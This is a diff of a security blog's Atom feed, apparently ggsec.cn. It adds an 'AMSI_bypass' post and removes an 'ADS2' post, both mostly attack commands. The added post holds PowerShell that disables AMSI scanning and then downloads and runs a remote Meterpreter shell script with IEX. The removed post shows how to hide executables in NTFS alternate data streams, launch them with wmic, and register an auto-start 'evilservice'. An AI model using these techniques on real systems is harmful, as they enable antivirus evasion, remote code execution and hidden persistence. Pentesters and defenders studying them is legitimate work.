@@ -57,6 +57,28 @@
   </entry>
   
   <entry>
+    <title>AMSI_bypass</title>
+    <link href="www.ggsec.cn/AMSI-bypass.html"/>
+    <id>www.ggsec.cn/AMSI-bypass.html</id>
+    <published>2018-09-27T14:43:10.000Z</published>
+    <updated>2018-09-27T14:46:19.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/808074FF85349D4227EB08F3A8DAD3CB.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/AMSI_bypass.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));</span><br><span class="line">$e=new-object net.webclient;</span><br><span class="line">$e.proxy=[Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">IEX $e.downloadstring('http://192.168.56.1/MeterRsh.txt');</span><br></pre></td></tr></table></figure><p><a href="https://pastebin.com/raw/iFVpKim5" target="_blank" rel="noopener">https://pastebin.com/raw/iFVpKim5</a><br><a href="https://twitter.com/search?q=https%3A%2F%2Fpastebin.com%2Fraw%2FiFVpKim5&amp;src=typd" target="_blank" rel="noopener">https://twitter.com/search?q=https%3A%2F%2Fpastebin.com%2Fraw%2FiFVpKim5&amp;src=typd</a><br><a href="https://github.com/kmkz/Pentesting/blob/master/Pentest-cheat-sheet" target="_blank" rel="noopener">https://github.com/kmkz/Pentesting/blob/master/Pentest-cheat-sheet</a></p><p><img src="http://oc78wb8cz.bkt.clouddn.com/A455589180EC1B9D7C61286B67D7AEBE.jpg" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/808074FF85349D4227EB08F3A8DAD3CB.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Invoke-Obfuscation</title>
     <link href="www.ggsec.cn/Invoke-Obfuscation.html"/>
     <id>www.ggsec.cn/Invoke-Obfuscation.html</id>
@@ -411,28 +433,6 @@
     
     
       <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ADS2 数据流</title>
-    <link href="www.ggsec.cn/ADS2.html"/>
-    <id>www.ggsec.cn/ADS2.html</id>
-    <published>2018-04-12T13:56:49.000Z</published>
-    <updated>2018-09-07T03:18:33.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/313B500D964093319BFFB928C47FB193.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/ADS2.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"empty file"</span> &gt; c:\ADS\file.txt</span><br><span class="line">makecab c:\ADS\procexp<span class="selector-class">.exe</span> c:\ADS\procexp.cab</span><br><span class="line">extrac32 C:\ADS\procexp<span class="selector-class">.cab</span> c:\ADS\file<span class="selector-class">.txt</span>:procexp.exe</span><br><span class="line">wmic process call create <span class="string">'"c:\ADS\file.txt:procexp.exe"'</span></span><br></pre></td></tr></table></figure><p><img src="http://oc78wb8cz.bkt.clouddn.com/86746AC5B99E0AF97FED1A7D5C35B43E.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"empty file"</span> &gt; c:\ADS\file.txt</span><br><span class="line">findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp<span class="selector-class">.exe</span> &gt; c:\ADS\file<span class="selector-class">.txt</span>:procexp.exe</span><br><span class="line">wmic process call create <span class="string">'"c:\ADS\file.txt:procexp.exe"'</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"empty file"</span> &gt; c:\ADS\file.txt</span><br><span class="line">type c:\windows\system32\cmd<span class="selector-class">.exe</span> &gt; c:\ADS\file<span class="selector-class">.txt</span>:cmd.exe</span><br><span class="line">sc create evilservice binPath= <span class="string">"\"c:\ADS\file.txt:cmd.exe\" /c echo works &gt; \"c:\ADS\works.txt\""</span> DisplayName= <span class="string">"evilservice"</span> start= <span class="attribute">auto</span></span><br><span class="line">sc start evilservice</span><br></pre></td></tr></table></figure><p><img src="http://oc78wb8cz.bkt.clouddn.com/508B058DD7C2020EB3B2DB5B0FD6939C.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print /d:c:\Users\demon\<span class="number">1</span><span class="selector-class">.txt</span>:procexp<span class="selector-class">.exe</span> c:\Users\demon\procexp.exe</span><br><span class="line">wmic process call create <span class="string">'"C:\Users\demon\1.txt:procexp.exe"'</span></span><br></pre></td></tr></table></figure><p><a href="https://www.youtube.com/watch?v=nPBcSP8M7KE&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=nPBcSP8M7KE&amp;feature=youtu.be</a></p><p> Link:  <a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/" target="_blank" rel="noopener">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/313B500D964093319BFFB928C47FB193.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
-    
-    
-      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
     
   </entry>
   
